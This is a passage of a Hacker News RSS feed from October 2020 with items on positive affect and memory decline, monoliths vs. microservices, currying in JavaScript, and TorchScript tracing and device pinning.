            <pubDate>Fri, 30 Oct 2020 13:27:06 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Happier You Are, the Less Likely You’re to Experience Memory Decline]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24941953">thread link</a>) | @conse_lad
<br/>
October 30, 2020 | https://sparkonit.com/2020/10/30/happier-less-likely-experience-memory-decline/ | <a href="https://web.archive.org/web/*/https://sparkonit.com/2020/10/30/happier-less-likely-experience-memory-decline/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
		Study says happy people are less likely to experience memory decline with age.	</p><div>
		
<!-- Quick Adsense WordPress Plugin: http://quickadsense.com/ -->

<p>The structure and function of brain cells continues to change throughout life, and most of its aspects decline as we age in response to a number of lifestyle factors. As these cells lose their ability to communicate with each other, our ability to retain memory disintegrates. But, is there a way to stop it from happening, or at least slow it down a bit?</p>
<p>Yes, and that’s by keeping a positive outlook in life.</p>
<p>A <a href="https://www.psychologicalscience.org/news/releases/2020-oct-positive-outlook-memory.html" target="_blank" rel="noopener noreferrer">new study</a> at Association for Psychological Science has revealed that people who lead a cheerful, enthusiastic life full of pride and joy are less likely to experience memory decline as they age. Psychologists have a term for it, and it’s called “<a href="https://link.springer.com/referenceworkentry/10.1007%2F978-0-387-79061-9_2193" target="_blank" rel="noopener noreferrer">positive affect</a>”. So the more a person experiences a positive affect, the more he or she is likely to retain memories, of which some could even last a lifetime.</p>
<p><img data-attachment-id="39297" data-permalink="https://sparkonit.com/2020/10/30/happier-less-likely-experience-memory-decline/happy-people-are-less-likely-to-experience-memory-decline-with-age/" data-orig-file="https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?fit=1920%2C1280&amp;ssl=1" data-orig-size="1920,1280" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="happy people are less likely to experience memory decline with age." data-image-description="" data-medium-file="https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?fit=300%2C200&amp;ssl=1" data-large-file="https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?fit=780%2C520&amp;ssl=1" loading="lazy" src="https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=780%2C520&amp;ssl=1" alt="happy people are less likely to experience memory decline with age" width="780" height="520" srcset="https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?w=1920&amp;ssl=1 1920w, https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=300%2C200&amp;ssl=1 300w, https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=1024%2C683&amp;ssl=1 1024w, https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=768%2C512&amp;ssl=1 768w, https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=1536%2C1024&amp;ssl=1 1536w" sizes="(max-width: 780px) 100vw, 780px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?w=1920&amp;ssl=1 1920w, https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=300%2C200&amp;ssl=1 300w, https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=1024%2C683&amp;ssl=1 1024w, https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=768%2C512&amp;ssl=1 768w, https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=1536%2C1024&amp;ssl=1 1536w" data-lazy-src="https://i2.wp.com/sparkonit.com/wp-content/uploads/2020/10/happy-people-are-less-likely-to-experience-memory-decline-with-age..jpg?resize=780%2C520&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"></p>
<!-- Quick Adsense WordPress Plugin: http://quickadsense.com/ -->


<p>For the study, the team looked at data from 991 adults who took part in a national study conducted three times between 1995 and 1996, 2004 and 2006, and 2013 and 2014.</p>
<p>Researchers then gauged the reports on a range of positive emotions the participants had experienced over the past 30 days. They also asked participants to take part in a memory test which consisted of recalling words immediately after a presentation and again 15 minutes later.</p>
<p>After successfully examining the association between positive affect and memory decline, while accounting for factors like age, gender, education, depression, negative affect, and extraversion, they found that individuals with higher levels of positive affect had a better memory retention over the course of almost a decade compared to those that had experienced lesser positive affect.</p>
<p>Positive affectivity has been tied to a <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC2895001/" target="_blank" rel="noopener noreferrer">number of favourable health outcomes</a>, including lowering the levels of stress, minimizing severity of depression, promoting longevity and other physiological functioning. And this new finding adds to a burgeoning area of research on the role of positive affect in healthy aging.</p>
<p>The study entitled <strong>“</strong><span><strong>Positive Affect Is Associated With Less Memory Decline: Evidence From a 9-Year Longitudinal Study”</strong>&nbsp;</span>has been published in the journal <em><a href="https://journals.sagepub.com/doi/10.1177/0956797620953883" target="_blank" rel="noopener noreferrer">Psychological Science</a></em>.</p>


<!-- Quick Adsense WordPress Plugin: http://quickadsense.com/ -->



	</div></div>]]>
            </description>
            <link>https://sparkonit.com/2020/10/30/happier-less-likely-experience-memory-decline/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941953</guid>
            <pubDate>Fri, 30 Oct 2020 13:24:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Monolithic vs. Microservices: Pros and Cons]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24941760">thread link</a>) | @renanmoura
<br/>
October 30, 2020 | https://renanmf.com/monolithic-microservices-pros-and-cons/ | <a href="https://web.archive.org/web/*/https://renanmf.com/monolithic-microservices-pros-and-cons/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main-container"><main id="main" itemscope="itemscope" itemtype="https://schema.org/CreativeWork"><div id="primary" data-v-spacing="top:bottom"><div data-sidebar="right"><section><article id="post-385" data-structure="default:wide"><section data-type="type-1"></section><div><h2>What is a Monolith?</h2><p>A Monolithic system is designed to produce one, self-contained, deliverable.</p><p>This deliverable will then be deployed in a whole bunch of different environments to be tested, validated, and finally, go to production and serve its users.</p><p>Monoliths are well-suited for a wide spectrum of solutions, especially small applications.</p><h3>Some pros of Monoliths</h3><p>It’s the current status quo on software development, which means everybody is used to think, design and work on systems following this architecture.</p><ul><li>To check the health status of your application is incredibly easy and there are a plethora of tools to help you with that.</li><li>Speaking on tools, on the developer’s side, our favorite IDE’s are all heavily optimized to work with monoliths: indexing, finding references, refactoring, debugging, etc.</li><li>Last but not least: the deploy is pretty straightforward! Well, in most cases at least.</li></ul><h3>Some cons of Monoliths</h3><ul><li>Updating the application’s technology stack gets harder and harder as the codebase grows.</li><li>A CI/CD (Continuous Integration and Continuous Delivery – aka Continuous Deployment) flow takes longer as the app becomes more complex, harming the feedback cycle.</li><li>Your system is so complete and full of functionalities that testing it takes forever, either manually or automatically.</li><li>The size of the app also implies a bigger team, which implies <a href="https://www.pmi.org/learning/library/effective-communication-better-project-management-6480">the biggest problem in project management</a>: communication.</li><li>Last but not least, the whole team’s productivity goes down as the project advances:<ul><li>The developer has too much code to handle and your IDE becomes a bottleneck.</li><li>The product manager has difficulties in planning releases because everything is so tied.</li><li>You have 600 feature branches that have to be synchronized, even if they are not directly related to each other.</li><li>The last point also implies rather complex merges</li></ul></li><li>Scaling is hard: remember Pareto’s 80/20? Well, if your users use 20% of the functionalities 80% of the time, as you get more users, you can’t scale only the 20%, you have to scale 100% of the software in production.</li><li>Domino effect: one bug can take down the entire system at once.</li></ul><h2>Enters Microservices</h2><p>A Microservices Architecture is typically described as an approach to divide your application into small and independent services. Done right, these small modules may be reusable and shared in multiple systems. Think about each service as SaaS (Software as a Service) on its own when consumed by other services.</p><h3>Some pros of Microservices</h3><ul><li>CI/CD becomes easier, if you need to update service A, service B will keep running.</li><li>Scalability where it needs to be: you can pinpoint the most used services and give them more RAM and CPU, which is also gonna save you some cash.</li><li>A bug crashing service B doesn’t take down service A, especially if you have implemented some good caching strategy in service A if it consumes some API in service B.</li><li>You can have small, specialized teams for every service, which diminishes the communication problems.</li><li>It is possible to use different technology stacks for each service and to consider the one that suits better the required features.</li><li>Different microservices can be reused for many systems, e.g., you may have a microservice specifically to deal with payments and share it with all your applications.</li></ul><h3>Some cons of Microservices</h3><ul><li>The health check is more difficult, you have to monitor every service and aggregate logs as well as track the requests passing by each microservice to debug them properly.</li><li>It is no easy task to find the boundaries between services properly, thus a good understanding of the business domain is needed, a good approach is DDD as described in <a href="https://www.amazon.com.br/Domain-Driven-Design-Tackling-Complexity-Software/dp/0321125215">Domain-Driven Design: Tackling Complexity in the Heart of Software</a>.</li><li>As a distributed system, you have to deal with other issues like network latency and failures.</li><li>Even with independent deploys, some level of coordination is necessary amongst the teams when major changes are made.</li><li>Knowing when and how to migrate from a Monolith to a Microservice.</li></ul><h2>Conclusion</h2><p>This was a first introduction to the topic of Microservices, I plan on doing more posts to explore it even further, concerning the right moment of adoption, actual tools for implementation and design patterns. As a general rule, when in doubt, start with a monolithic approach and move to microservices if needed.</p></div></article></section></div></div></main></div></div>]]>
            </description>
            <link>https://renanmf.com/monolithic-microservices-pros-and-cons/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941760</guid>
            <pubDate>Fri, 30 Oct 2020 13:03:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Functional Programming in JavaScript, part I – Composition]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 1 (<a href="https://news.ycombinator.com/item?id=24941678">thread link</a>) | @chrismiaskowski
<br/>
October 30, 2020 | https://11sigma.com/blog/functional-programming-in-js-part-i-composition | <a href="https://web.archive.org/web/*/https://11sigma.com/blog/functional-programming-in-js-part-i-composition">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><blockquote><p>This article was originally published on Mateusz's <a href="https://dev.to/mpodlasin/functional-programming-in-js-part-i-composition-currying-lodash-and-ramda-1ohb">dev.to profile</a>.</p><p>Mateusz says about himself: "I write in-depth articles about JavaScript, React and functional programming."</p></blockquote><p>In this series of articles, we will go through a soft introduction to functional programming in JavaScript.</p><p>Each article will be devoted to a different aspect of functional programming. After the theoretical introduction, we will see how those concepts are then used in actual, real world JavaScript libraries.</p><p>This mix of theory and practice will ensure that you get a deep understanding of all the concepts while being able to use them effortlessly in practice in your day to day work.</p><p>Please be aware that this series assumes that you already have some proficiency in writing code with arrays' methods such as <code>map</code>, <code>filter</code>, and <code>reduce</code>. If they still confuse you, let me know, and I will write an article explaining them in-depth.</p><p>Ready? Let's get started!</p><h2>Composition</h2><p>If I had to name in one word what this first article will focus on, it would be <em>composition</em> or <em>composability</em>.</p><p>More specifically, I mean here the art of composing your code from small, reusable functions, almost like composing a lego set from smaller pieces.</p><p>It turns out that a properly written functional code is very composable. What does it mean? It means that it is extremely easy to take a small piece of that code and reuse it in a completely different situation.</p><p>Take a look at this code, written in traditional style:</p><pre><code><span>let</span> result <span>=</span> <span>[</span><span>]</span><span>;</span>

<span>for</span> <span>(</span><span>let</span> i <span>=</span> <span>0</span><span>,</span> i <span>&lt;</span> data<span>.</span><span>length</span><span>,</span> i<span>++</span><span>)</span> <span>{</span>
    <span>const</span> num <span>=</span> <span>parseInt</span><span>(</span>data<span>[</span>i<span>]</span><span>,</span> <span>10</span><span>)</span><span>;</span>

    <span>if</span> <span>(</span>num <span>&lt;</span> <span>5</span><span>)</span> <span>{</span>
        result<span>.</span><span>push</span><span>(</span>num<span>)</span><span>;</span>
    <span>}</span>
<span>}</span></code></pre><p>and now compare it to:</p><pre><code><span>const</span> <span>stringToInt</span> <span>=</span> <span>str</span> <span>=&gt;</span> <span>parseInt</span><span>(</span>str<span>,</span> <span>10</span><span>)</span><span>;</span>
<span>const</span> <span>lessThan</span> <span>=</span> <span>compareTo</span> <span>=&gt;</span> <span>num</span> <span>=&gt;</span> num <span>&lt;</span> compareTo<span>;</span>

<span>const</span> result <span>=</span> data
    <span>.</span><span>map</span><span>(</span>stringToInt<span>)</span>
    <span>.</span><span>filter</span><span>(</span><span>lessThan</span><span>(</span><span>5</span><span>)</span><span>)</span><span>;</span></code></pre><p>Those two snippets do the same thing. We first take the <code>data</code> array, which is filled with some strings. We then transform those strings into integers. And finally, we store only those integers that are strictly smaller than 5 in a new array. We keep that array under the <code>result</code> variable.</p><p>So if we got an <code>["1", "6", "3"]</code> array, we would return <code>[1, 3]</code> as a result.</p><p>Depending on which style you are more accustomed to, you will find one of the two above snippets more readable. I believe that the second one is more readable because - not taking into the account little helper functions that we defined - it reads almost like English:</p><p>Take <code>data</code>, <code>mapEach</code>, <code>stringToInt</code> and then <code>filter</code> only those values that are <code>lessThan(5)</code>.</p><p>However, if you are not used to functional style, this second snippet will seem awkward and needlessly convoluted. Are there any objective benefits of writing the code in that style?</p><p>Of course! And that benefit is exactly the composability. Note that we went out of our way to define even the simplest pieces of our code as functions. Thanks to that, we can now use those snippets in entirely new situations without ever writing the same code twice.</p><p>Of course, those reusable <code>stringToInt</code> and <code>lessThan</code> functions are extremely simple, to the point where it arguably is not worth reusing them like that. But keep in mind that this example only serves as a motivation for the whole approach.</p><p>In more complex applications, those functions would be getting more and more complicated. The approach of reusing the most amount of code possible and composing new code from previously written functions will have much more apparent benefits in a bigger codebase.</p><p>Note also that apart from the simplest possible reusability - simply using <code>stringToInt</code> and <code>lessThan</code> functions in different contexts - we also see examples of using higher-order array functions - <code>map</code> and <code>filter</code>. It is key to note that they possess an immense power - they allow you to use functions defined for singular values (for example, strings) on whole arrays of those values (for instance, on arrays of strings).</p><p>This is the first moment when you can see the power of that approach. You wrote two functions - <code>stringToInt</code> and <code>lessThan</code> - that are not supposed to be used on arrays. And yet, by wrapping them in only a few more characters - <code>.map(stringToInt)</code>, <code>.filter(lessThan(5))</code> - you suddenly possess the power to use those functions on whole arrays of values.</p><p>This is precisely what we meant at the beginning. The functional approach allows you to use the same code in entirely different contexts - in fact, here, the same code is even used on completely different types of values! A function that was meant to work only on strings can now work on arrays of strings! That's pretty cool.</p><h2>Currying</h2><p>Perhaps you have already asked yourself - "wait, what is this weird definition of <code>lessThan</code> about?".</p><p>If I asked you to write a <code>lessThan</code> function, you would probably do it like that:</p><pre><code><span>const</span> <span>lessThan</span> <span>=</span> <span>(</span><span>num<span>,</span> compareTo</span><span>)</span> <span>=&gt;</span> num <span>&lt;</span> compareTo<span>;</span></code></pre><p>And yet we did it like that:</p><pre><code><span>const</span> <span>lessThan</span> <span>=</span> <span>compareTo</span> <span>=&gt;</span> <span>num</span> <span>=&gt;</span> num <span>&lt;</span> compareTo<span>;</span></code></pre><p>Not only arguments are switched, but also the syntax of a function definition is different. Is this some new, exotic addition to the JavaScript standard?</p><p>In fact, no. What we did here is that we wrote a function that returns another function.</p><p>Function that we are returning is:</p><pre><code><span>num</span> <span>=&gt;</span> num <span>&lt;</span> compareTo<span>;</span></code></pre><p>And then we wrap it in another function, that finally provides <code>compareTo</code> variable for it:</p><pre><code><span>compareTo</span> <span>=&gt;</span> <span>(</span><span>num</span> <span>=&gt;</span> num <span>&lt;</span> compareTo<span>)</span><span>;</span></code></pre><p>This time we wrapped the returned function in parentheses for better readability.</p><p>Note that we used here the fact that in an arrow function, we can provide returned value directly, instead of the function body. If we wanted to write the body, we might rewrite the above example like so:</p><pre><code><span>compareTo</span> <span>=&gt;</span> <span>{</span>
    <span>return</span> <span>num</span> <span>=&gt;</span> num <span>&lt;</span> compareTo<span>;</span>
<span>}</span><span>;</span></code></pre><p>In fact, this pattern doesn't really rely on ES6 arrow function syntax. Me might have as well written it in old school function syntax:</p><pre><code><span>function</span><span>(</span><span>compareTo</span><span>)</span> <span>{</span>
    <span>return</span> <span>function</span><span>(</span><span>num</span><span>)</span> <span>{</span>
        <span>return</span> num <span>&lt;</span> compareTo<span>;</span>
    <span>}</span><span>;</span>
<span>}</span></code></pre><p>What ES6 arrow syntax does, however, is that it makes that monstrous code look much nicer:</p><pre><code><span>compareTo</span> <span>=&gt;</span> <span>num</span> <span>=&gt;</span> num <span>&lt;</span> compareTo<span>;</span></code></pre><p>That pattern is called currying.</p><p>If you take a function taking some number of parameters:</p><pre><code><span>const</span> <span>someFunction</span> <span>=</span> <span>(</span><span>a<span>,</span> b<span>,</span> c</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>// some code here</span>
<span>}</span><span>;</span></code></pre><p>you can "curry" it (or produce its "curried" version), which looks like that:</p><pre><code><span>const</span> <span>someFunction</span> <span>=</span> <span>a</span> <span>=&gt;</span> <span>b</span> <span>=&gt;</span> <span>c</span> <span>=&gt;</span> <span>{</span>
    <span>// some code here</span>
<span>}</span><span>;</span></code></pre><p>In this case, the original function accepts three parameters.</p><p>After currying it, we get a function that accepts one parameter <code>a</code>, returns a function that takes one parameter <code>b</code>, then returns a function that accepts one parameter <code>c</code> and finally executes the original function's body.</p><p>Ok, we explained <em>how</em> that mechanism works, but we didn't explain why we even decided to write our functions like that.</p><p>Frankly, the answer is extremely simple. The only reason is so that we could later use the <code>lessThan</code> function like so:</p><pre><code><span>.</span><span>filter</span><span>(</span><span>lessThan</span><span>(</span><span>5</span><span>)</span><span>)</span></code></pre><p>Note that if we used our first definition of that function:</p><pre><code><span>const</span> <span>lessThan</span> <span>=</span> <span>(</span><span>num<span>,</span> compareTo</span><span>)</span> <span>=&gt;</span> num <span>&lt;</span> compareTo<span>;</span></code></pre><p>then applying it in the <code>filter</code> method wouldn't be nearly as nice. We would have to write that code like so:</p><pre><code><span>.</span><span>filter</span><span>(</span><span>num</span> <span>=&gt;</span> <span>lessThan</span><span>(</span>num<span>,</span> <span>5</span><span>)</span><span>)</span></code></pre><p>So again, you see that we wrote our function in a way that makes it compose nicely with methods such as <code>filter</code>.</p><p>It also composes nicely with a <code>map</code>. Writing code like this:</p><pre><code>numbers<span>.</span><span>map</span><span>(</span><span>lessThan</span><span>(</span><span>5</span><span>)</span><span>)</span></code></pre><p>would return an array of booleans saying if the number on a given place in the array is smaller than 5. For example, running that code on an array <code>[5, 1, 4]</code>, would return an array <code>[false, true, true]</code>.</p><p>So you can see that <code>lessThan</code> function composes now much nicer with other, higher-order functions.</p><p>On top of that, assume we noticed that we use <code>lessThan</code> very often with a number 5 specifically. Maybe that's a very important number, let's say a number of the servers we have in the company.</p><p>This number now appears in several places in our code. But having it hard-coded like that is a very bad practice. What if that number changes at some point, for example, to a 6? We would have to search for all those appearances of 5 and change them to 6 manually. This would be both too cumbersome and error-prone.</p><p>The first solution that comes to mind is to store that number in a variable, a constant with some semantic name that describes what this number means:</p><pre><code><span>const</span> <span>NUMBER_OF_SERVERS</span> <span>=</span> <span>5</span><span>;</span></code></pre><p>Now we can use the constant instead of the number:</p><pre><code><span>.</span><span>filter</span><span>(</span><span>lessThan</span><span>(</span><span>NUMBER_OF_SERVERS</span><span>)</span><span>)</span></code></pre><p>If that number changes (for example, our company buys more servers), we can update it in one place, where that constant is defined.</p><p>This is certainly nicer and very readable, but it's still a tiny bit cumbersome to import two distinct values (<code>lessThan</code> and <code>NUMBER_OF_SERVERS</code>) even though we always want to use them together.</p><p>However, the way we defined the <code>lessThan</code> function allows us to fix that. We can store the returned function in another variable!</p><pre><code><span>const</span> lessThanNumberOfServers <span>=</span> <span>lessThan</span><span>(</span><span>NUMBER_OF_SERVERS</span><span>)</span><span>;</span></code></pre><p>Now, whenever we want to use that function with that specific value, we can import it once and use it directly:</p><pre><code><span>.</span><span>filter</span><span>(</span>lessThanNumberOfServers<span>)</span></code></pre><p>Our function is more composable with other functions, but it also allows us to define new functions in a very easy manner.</p><p>Very often certain values in our functions are only some kind of configuration. Those values do not change very often. In fact, you will often find yourself hard-coding those values inside your functions:</p><pre><code><span>const</span> <span>someFunction</span> <span>=</span> <span>(</span><span><span>...</span>someArguments</span><span>)</span> <span>=&gt;</span> <span>{</span>
   <span>const</span> <span>SOME_VALUE_THAT_WILL_PROBABLY_NOT_CHANGE</span> <span>=</span> <span>5</span><span>;</span>

   <span>// some code here</span>
<span>}</span><span>;</span></code></pre><p>It's sometimes a good idea to put such value as an argument of a curried function and simply create a new function, with this value already set to a value we expect to be the most common:</p><pre><code><span>const</span> <span>someBiggerFunction</span> <span>=</span> <span>(</span><span>someValueThatWillProbablyNotChange</span><span>)</span> <span>=&gt;</span> <span>(</span><span><span>...</span>someArguments</span><span>)</span> <span>=&gt;</span> <span>{</span>
    <span>// some code here</span>
<span>}</span>

<span>const</span> someFunction <span>=</span> <span>someBiggerFunction</span><span>(</span><span>5</span><span>)</span><span>;</span></code></pre><p>This pattern is handy because it ultimately gives you the same result - a function with a value hard-coded inside. But at the same time, you get much bigger flexibility. When it turns out it is necessary to set that variable to some …</p></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://11sigma.com/blog/functional-programming-in-js-part-i-composition">https://11sigma.com/blog/functional-programming-in-js-part-i-composition</a></em></p>]]>
            </description>
            <link>https://11sigma.com/blog/functional-programming-in-js-part-i-composition</link>
            <guid isPermaLink="false">hacker-news-small-sites-24941678</guid>
            <pubDate>Fri, 30 Oct 2020 12:51:28 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mastering TorchScript: Tracing vs. Scripting, Device Pinning, Graph Modification]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24941642">thread link</a>) | @briggers
<br/>
October 30, 2020 | https://paulbridger.com/posts/mastering-torchscript/ | <a href="https://web.archive.org/web/*/https://paulbridger.com/posts/mastering-torchscript/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
  
  
  <h5>October 29, 2020</h5>



  
  
  

  


  <h2 id="intro">
  Intro
  <a href="#intro">#</a>
</h2>
<p>TorchScript is one of the most important parts of the Pytorch ecosystem, allowing portable, efficient and nearly seamless deployment. With just a few lines of <code>torch.jit</code> code and some simple model changes you can export an asset that runs anywhere <code>libtorch</code> does. It’s an important toolset to master if you want to run your models outside the lab at high efficiency.</p>
<p>Good <a href="https://pytorch.org/tutorials/beginner/Intro_to_TorchScript_tutorial.html">introductory material</a> is already available for starting to work with <a href="https://pytorch.org/docs/stable/jit.html">TorchScript</a> including <a href="https://pytorch.org/tutorials/advanced/cpp_export.html">execution in the C++ <code>libtorch</code> runtime</a>, and <a href="https://pytorch.org/docs/stable/jit_language_reference.html">reference material</a> is also provided. This article is a collection of topics going beyond the basics of your first export.</p>
<h2 id="tracing-vs-scripting">
  Tracing vs Scripting
  <a href="#tracing-vs-scripting">#</a>
</h2>
<p>Pytorch provides two methods for generating TorchScript from your model code — tracing and scripting — but which should you use? Let’s recap how they work:</p>
<ul>
<li>
<p><a href="https://pytorch.org/docs/stable/generated/torch.jit.trace.html"><strong>Tracing.</strong></a> When using <code>torch.jit.trace</code> you’ll provide your model and sample input as arguments. The input will be fed through the model as in regular inference and the executed operations will be traced and recorded into TorchScript. Logical structure will be frozen into the path taken during this sample execution.</p>
</li>
<li>
<p><a href="https://pytorch.org/docs/stable/generated/torch.jit.script.html"><strong>Scripting.</strong></a> When using <code>torch.jit.script</code> you’ll simply provide your model as an argument. TorchScript will be generated from the static inspection of the <code>nn.Module</code> contents (recursively).</p>
</li>
</ul>
<p>It’s not obvious from the tutorial documentation, but choosing which method to use is a fairly simple and fluid choice:</p>
<h3 id="use-scripting-by-default">
  Use Scripting by Default
  <a href="#use-scripting-by-default">#</a>
</h3>
<p>Because <code>torch.jit.script</code> captures both the operations and full conditional logic of your model, it’s a great place to start. If your model doesn’t need any <a href="https://pytorch.org/docs/stable/jit_unsupported.html">unsupported Pytorch functionality</a> and has logic restricted to the <a href="https://pytorch.org/docs/stable/jit_builtin_functions.html#python-built-in-functions">supported subset of Python functions</a> and <a href="https://pytorch.org/docs/stable/jit_python_reference.html">syntax</a>, then <code>torch.jit.script</code> should be all you need.</p>
<p>One major advantage of scripting over tracing is that an export is likely to either fail for a well-defined reason — implying a clear code modification — or succeed without warnings.</p>
<blockquote>
  <p><strong>Unlike Python, TorchScript is Statically Typed</strong></p>
<p>You will need to be consistent about container element datatypes, and be wary of implicit function signatures. A useful practice is to use type hints in method signatures.</p>

</blockquote>

<p>Despite TorchScript’s ability to capture conditional logic it does not allow you to run arbitrary Python within <code>libtorch</code> — a popular misconception.</p>
<h3 id="use-tracing-if-you-must">
  Use Tracing if You Must
  <a href="#use-tracing-if-you-must">#</a>
</h3>
<p>There are a few special cases in which <code>torch.jit.trace</code> may be useful:</p>
<ul>
<li>If you are unable to modify the model code — because you do not have access or ownership — you may find scripting the model simply will not work because it uses unsupported Pytorch/Python functionality.</li>
<li>In pursuit of performance or to bake in architectural decisions the logic freezing behavior of tracing might be preferable — similar to inlining C/C++ code.</li>
</ul>
<blockquote>
  <p><strong>Pay Close Attention to Tracer Warnings</strong></p>
<p>Due to how tracing can simplify model behavior, each warning should be fully understood and only then ignored (or fixed). Also, be sure to trace in eval mode if you are exporting a model for production inference!</p>

</blockquote>

<h3 id="use-both-together">
  Use Both Together
  <a href="#use-both-together">#</a>
</h3>
<p>Scripted and traced code can be freely mixed, and this is often a great choice. See the existing <a href="https://pytorch.org/">pytorch.org</a> documentation for <a href="https://pytorch.org/docs/stable/jit.html#mixing-tracing-and-scripting">details</a> and <a href="https://pytorch.org/tutorials/beginner/Intro_to_TorchScript_tutorial.html#mixing-scripting-and-tracing">examples</a>.</p>
<h2 id="device-pinning">
  Device Pinning
  <a href="#device-pinning">#</a>
</h2>
<p>If you find yourself using <code>torch.jit.trace</code> on some code, you’ll have to actively deal with some of the gotchas or face performance and portability consequences. Besides addressing any warnings Pytorch emits, you’ll also need to keep an eye out for device pinning. Just like <code>torch.jit.trace</code> records and freezes conditional logic, it will also trace and make constant the values resulting from this logic — this can include device constants.</p>
<p>Using this sample code:</p>
<div><pre><code data-lang="python"><span>def</span> <span>forward</span><span>(</span><span>X</span><span>):</span>
    <span>return</span> <span>torch</span><span>.</span><span>arange</span><span>(</span><span>X</span><span>.</span><span>size</span><span>(</span><span>0</span><span>))</span></code></pre></div>
<p>If we trace while executing on CPU or GPU we get this TorchScript (scroll to the right on mobile):</p>
<div><pre><code data-lang="python"><span>def</span> <span>forward</span><span>(</span><span>X</span><span>:</span> <span>Tensor</span><span>)</span> <span>-&gt;</span> <span>Tensor</span><span>:</span>
  <span>_0</span> <span>=</span> <span>ops</span><span>.</span><span>prim</span><span>.</span><span>NumToTensor</span><span>(</span><span>torch</span><span>.</span><span>size</span><span>(</span><span>X</span><span>,</span> <span>0</span><span>))</span>
  <span>_1</span> <span>=</span> <span>torch</span><span>.</span><span>arange</span><span>(</span><span>annotate</span><span>(</span><span>number</span><span>,</span> <span>_0</span><span>),</span> <span>dtype</span><span>=</span><span>None</span><span>,</span> <span>layout</span><span>=</span><span>0</span><span>,</span> <span>device</span><span>=</span><span>torch</span><span>.</span><span>device</span><span>(</span><span>"cpu"</span><span>),</span> <span>pin_memory</span><span>=</span><span>False</span><span>)</span>
  <span>return</span> <span>_1</span></code></pre></div>
<!-- raw HTML omitted -->
<p>You can see that <code>torch.device("cpu")</code> has been inserted as a constant into the generated TorchScript. If we try to get clever with this code:</p>
<div><pre><code data-lang="python"><span>def</span> <span>forward</span><span>(</span><span>X</span><span>):</span>
    <span>return</span> <span>torch</span><span>.</span><span>arange</span><span>(</span><span>X</span><span>.</span><span>size</span><span>(</span><span>0</span><span>),</span> <span>device</span><span>=</span><span>X</span><span>.</span><span>device</span><span>)</span></code></pre></div>
<p>Tracing will now result in TorchScript that is pinned to the tracing device. When traced on GPU, we see this:</p>
<div><pre><code data-lang="python"><span>def</span> <span>forward</span><span>(</span><span>self</span><span>,</span>
    <span>X</span><span>:</span> <span>Tensor</span><span>)</span> <span>-&gt;</span> <span>Tensor</span><span>:</span>
  <span>_0</span> <span>=</span> <span>ops</span><span>.</span><span>prim</span><span>.</span><span>NumToTensor</span><span>(</span><span>torch</span><span>.</span><span>size</span><span>(</span><span>X</span><span>,</span> <span>0</span><span>))</span>
